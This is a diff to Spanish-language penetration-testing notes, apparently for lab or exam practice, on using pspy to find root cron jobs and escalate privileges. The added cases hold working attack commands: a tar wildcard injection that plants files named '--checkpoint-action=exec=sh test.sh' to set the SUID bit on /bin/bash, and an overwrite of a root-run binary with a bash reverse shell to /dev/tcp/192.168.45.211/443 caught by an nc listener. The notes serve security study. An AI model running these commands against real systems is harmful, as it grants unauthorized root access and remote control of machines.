@@ -23,6 +23,10 @@ PSPY es una herramienta Linux que monitorea procesos en tiempo real sin necesida
 
 * [PSPY](https://github.com/DominicBreuker/pspy)
 
+IMPORTANTE:
+- Salir de pspy con ``Ctrl +z`` para no perder la revershell 
+- Esperar al menos 5 min 
+
 ```bash 
 ❯ git clone https://github.com/DominicBreuker/pspy
 
@@ -104,6 +108,59 @@ Paso 3:
 Paso 4:
 # En Kali levantar el listener para recibir la revershell 
 ❯ nc -nlvp 4444
+```
+
+#### PSPY - CASO 4 "Tar Wildcard Injection"
+```bash
+# Se obtiene lo siguiente durante el escaneo:
+ 
+	CMD: UID=0     PID=28802  | /bin/bash -c cd /opt/admin && tar -zxf /tmp/backup.tar.gz * 
+
+
+NOTA:
+	- El * es el problema — bash expande el wildcard a todos los archivos del directorio antes de pasárselos a tar. Entonces si tienes archivos con nombres especiales, bash los interpreta como argumentos de tar.
+```
+
+```bash 
+Paso 1:
+❯ cd /opt/admin 
+
+Paso 2:
+❯ echo "chmod u+s /bin/bash" > test.sh
+❯ echo "" > "--checkpoint-action=exec=sh test.sh"
+❯ echo "" > "--checkpoint=1"
+
+Donde:
+	--checkpoint-action=exec=sh test.sh → ejecuta un script en cada checkpoint
+	--checkpoint=1 → hace checkpoint cada 1 registro
+
+Lo que pasará cuando se ejecute de nuevo el CRON:
+tar -zxf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh test.sh test.sh
+
+Paso 3:
+❯ ls -la /bin/bash  # Confirmar el cambio 
+❯ /bin/bash -p      # Ejecutar como root 
+```
+
+#### PSPY - CASO 5
+```bash 
+# Se obtiene lo siguiente durante el escaneo:
+
+CMD: UID=0     PID=84622  | python2.7 /opt/aerospike/bin/asadm --asinfo-mode -e 'STATUS' 
+
+NOTA:
+	- El asadm es ejecutado por root 
+
+# Mirar sus privilegios
+❯ ls -la opt/aerospike/bin/asadm
+	-rwxr-xr-x 1 aero aero 6723733 Dec  7  2019 opt/aerospike/bin/asadm
+```
+
+```bash 
+Paso 1:
+❯ echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.211/443 0>&1'" > /opt/aerospike/bin/asadm
+
+❯ rlwrap nc -nlvp 443 
 ```
 
 
